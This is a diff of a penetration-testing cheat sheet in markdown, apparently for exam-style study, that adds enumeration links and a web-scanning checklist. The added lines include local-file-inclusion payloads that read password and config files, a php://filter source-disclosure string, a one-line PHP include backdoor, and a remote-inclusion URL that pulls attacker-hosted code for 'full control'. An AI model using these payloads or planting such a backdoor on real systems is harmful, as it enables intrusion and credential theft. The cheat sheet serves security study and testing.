@@ -64,6 +64,7 @@ https://github.com/r4hn1/Pentesting-Cheatsheet
 ## Enumeration
 1. https://github.com/oncybersec/oscp-enumeration-cheat-sheet?tab=readme-ov-file#ssh-22tcp
 2. https://docs.gorigorisensei.com/ports-enum/port-80
+3. https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
 
 ### Port Scan
 ```bash
@@ -161,6 +162,21 @@ hydra -l root -P /usr/share/wordlists/password/10k <RHOST> -t 4 ssh
 -    [Rubeus](https://github.com/GhostPack/Rubeus)  
 
 ### Web scan (80, 443, 8080, 8081, 8443, and 3000)
+Things to be on look for:
+     - Visit all URLs from robots.txt.
+     - Default credentials for software
+     - SQL-injectable GET/POST params
+     - LFI/RFI through ?page=foo type params
+     - LFI:
+          /etc/passwd | /etc/shadow insta-win
+          /var/www/html/config.php or similar paths to get SQL etc creds
+          ?page=php://filter/convert.base64-encode/resource=../config.php
+          ../../../../../boot.ini to find out windows version
+    - RFI:
+          Have your PHP/cgi downloader ready
+          <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
+          Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
+          get phpinfo()
 ```bash
 #Nikto
 nikto -h x.x.x.x
@@ -318,6 +334,8 @@ nikto -h <RHOST> -p 443 -output nikto_443
 #SSLScan  
 sslscan <ip>
 ```
+### Master SQL
+https://sqlwiki.netspi.com/
 
 ### MSSQL (1433)
 ```bash
